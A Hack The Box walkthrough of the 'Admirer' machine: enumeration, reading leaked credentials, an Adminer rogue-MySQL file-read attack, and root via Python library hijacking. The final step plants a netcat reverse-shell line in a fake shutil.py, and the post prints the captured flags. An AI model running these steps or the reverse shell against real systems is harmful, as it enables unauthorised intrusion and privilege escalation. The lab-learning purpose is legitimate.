---
title: "HTB - Admirer"
categories: [box]
date: 2020-09-03
hasComments: true
image: /images/walkthroughs/hackthebox/traceback/traceback_logo.png
description: HTB - Admirer walkthrough.
---

# Admirer

<p align="center">
  <img src="/images/walkthroughs/hackthebox/admirer/1_admirer.png" width="500"/>
</p>


## Enumeration



- Nikto _nikto -h "http://10.10.10.187"_:


```+ "robots.txt" contains 1 entry which should be manually viewed.```


- NMap _nmap -A -p- -T4 10.10.10.187_:


```
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
```

_http://10.10.10.187/robots.txt_ contains:

```
User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
```

User: **waldo**
Dir: /admin-dir

We will launch dirbuster with the medium wordlist and checking the directory _/admin-dir_

<p align="center">
  <img src="/images/walkthroughs/hackthebox/admirer/2_dirbuster_admindir.png" width="500"/>
</p>


- _http://10.10.10.187/admin-dir/contacts.txt_

```
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb

##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb

#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

- _http://10.10.10.187/admin-dir/credentials.txt_

```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

Lets check out some of the credentials:

- FTP:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/admirer/4_ftp_ls.png" width="650"/>
</p>

On the FTP we can find two files and we retrieve them:

- dump.sql
- html.tar.gz

Lets enumerate those files:

- dump.sql:

```
-- MySQL dump 10.16  Distrib 10.1.41-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: admirerdb
-- ------------------------------------------------------
-- Server version	10.1.41-MariaDB-0+deb9u1
```

- html.tar.gz:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/admirer/5_html_tar_gz.png" width="500"/>
</p>

- db_admin.php

```
$servername = "localhost";
$username = "waldo";
$password = "Wh3r3_1s_w4ld0?";
...
// TODO: Finish implementing this or find a better open source alternative
```

- admin_tasks.php

<p align="center">
  <img src="/images/walkthroughs/hackthebox/admirer/5_admin_task.png" width="700"/>
</p>


- phptest.php

```
<?php
  echo("Just a test to see if PHP works.");
?>
 ```

- info.php

```<?php phpinfo(); ?>```

- index.php

```
$servername = "localhost";
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A"d6b";
$dbname = "admirerdb";
```

- robots.txt

```
User-agent: *

# This folder contains personal stuff, so no one (not even robots!) should see it - waldo
Disallow: /w4ld0s_s3cr3t_d1r
```


Making a recap we can try to reach the websites:

http://10.10.10.187/utility-scripts/admin_tasks.php

<p align="center">
  <img src="/images/walkthroughs/hackthebox/admirer/6_admin_tasks.png" width="500"/>
</p>

At the moment I got stucked, no ssh user with any of the passwords, no more hide websites, no bypass on the admin_tasks.php...
From the websites I visited, I could see all of them but the db_admin.php, and also the robots.txt was modified, changing 
/w4ld0s_s3cr3t_d1r to /admin-dir...


On the main website:

```<!-- Still under development... This does not send anything yet, but it looks nice! -->```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/admirer/2_enum_footer.png" width="500"/>
</p>


Nothing in the main website, comming back to other comments.
From the file db_admin.php:

```// TODO: Finish implementing this or find a better open source alternative```

Lets find out some open source admin db:

Google: [admin db open source](https://techtalk.gfi.com/top-10-free-database-tools-for-sys-admins/) We can see Adminer. More like Admirer.

We can check the default webpage for this tool, it appeared inside the utility-script:

_http://10.10.10.187/utility-scripts/adminer.php_


<p align="center">
  <img src="/images/walkthroughs/hackthebox/admirer/8_adminer.png" width="500"/>
</p>


After trying the different set of passwords showed in different part of the website, no one could work. So knowing the version and the technology, I looked into Google:

This [website](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool) shows the vulnerability.


## Exploitation

Install MySQL if not installed:


```
sudo apt update
sudo apt install -y wget
wget https://dev.mysql.com/get/mysql-apt-config_0.8.15-1_all.deb
sudo dpkg -i mysql-apt-config_0.8.15-1_all.deb
ubuntu bionic

sudo apt update
sudo apt install mysql-community-server

sudo nano /etc/mysql/mysql.conf.d/mysqld.cnf
+ bind-address    = 0.0.0.0

sudo systemctl enable --now mysql
systemctl status mysql
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/admirer/8_adminer.png" width="500"/>
</p>


```
mysql -u root -p
mysql> create database admirer;
mysql> use admirer;
mysql> create table main(id INT(10));
mysql> SET GLOBAL local_infile=1; (so we can search for files)
```

Once we have the database up, we will go to the website and place our IP and credentials, which will make the server to call us back to retrieve the database.

If you get an error on login like this one:

```Host '10.10.10.187' is not allowed to connect to this MySQL server```

You can check out this [StackOverflow post](https://stackoverflow.com/questions/1559955/host-xxx-xx-xxx-xxx-is-not-allowed-to-connect-to-this-mysql-server) telling you about a security measure by default, and remember that is not a great idea to have this kind of users with this kind of privileges open to the internet _0.0.0.0_

```
mysql> CREATE USER 'kashmir'@'localhost' IDENTIFIED BY 'password';
mysql> GRANT ALL PRIVILEGES ON *.* TO 'kashmir'@'localhost'
    ->     WITH GRANT OPTION;
mysql> CREATE USER 'kashmir'@'%' IDENTIFIED BY 'password';
mysql> GRANT ALL PRIVILEGES ON *.* TO 'kashmir'@'%'
    ->     WITH GRANT OPTION;
```

Once we have all set up, login:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/admirer/9_admirer_local.png" width="500"/>
</p>

With the code explained in this [website](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool) we can perform the file disclosure. By placing the file we want and the table we have created, we can retrieve the file. 

```
load data local infile '../index.php'
into table main
fields terminated by "/n"
```

Clicking into warning we can see the following credentials disclosure:

```
$servername = "localhost";'
$username = "waldo";
$password = "&<h5b~yK3F#{PaPB&dA}{H>";
$dbname = "admirerdb";' 
```

We have one more credential so let's try out the ssh, either way we will go back into the file or login into the adminer (spoiler, those credential didnt work in the adminer login).

Using those credentials on ssh we got access as waldo

<p align="center">
  <img src="/images/walkthroughs/hackthebox/admirer/11_user.png" width="500"/>
</p>

```
user.txt:9ff9185225daf6efd28dc40a07fc4271 
```

## Privilege scalation

We can see waldo can run admin_tasks.sh

<p align="center">
  <img src="/images/walkthroughs/hackthebox/admirer/12_sudo_l.png" width="500"/>
</p>

admin_tasks.sh has functions to backup the passwd and shadow files, but the privileges of the generated files are only for root, so we got nothing to do there. Before getting into pe tools, we can see a python script with root privileges on the same directory:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/admirer/12_opt.png" width="500"/>
</p>

And on the admin_tasks.sh we can run we see that the backup.py is executed

{% highlight bash %}

#!/bin/bash

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

{% endhighlight %}

The python script imports shutil -> make_archive and then call it. We can hijack the library and get arbitrary code executed:


We will create a file with a reverse shell called as the library we want to hijack )_shutil.py_) and the function it imports (_make_archive_) with the following content:

```
waldo@admirer:/opt/scripts$ nano /tmp/shutil.py
import os 

def make_archive(a, b, c):
	os.system('nc 10.10.14.94 4444 -e "/bin/sh"')

```

Then we can run the script with the **PYTHONPATH** env variable which determinate where to search the imported libraries with the following command:

```waldo@admirer:/opt/scripts$ sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh```

Before running the command, get the netcat ready to receive the prompt:

```
nc -lvnp 4444
```

Run admin_tasks.sh and the option 6:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/admirer/13_pre_root.png" width="500"/>
</p>


Then we take into the netcat and finish the task:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/admirer/13_root.png" width="500"/>
</p>

```
root@admirer:~# cat root.txt    
cat root.txt
5fbc13d34c715f7da061cb8be903ed22
```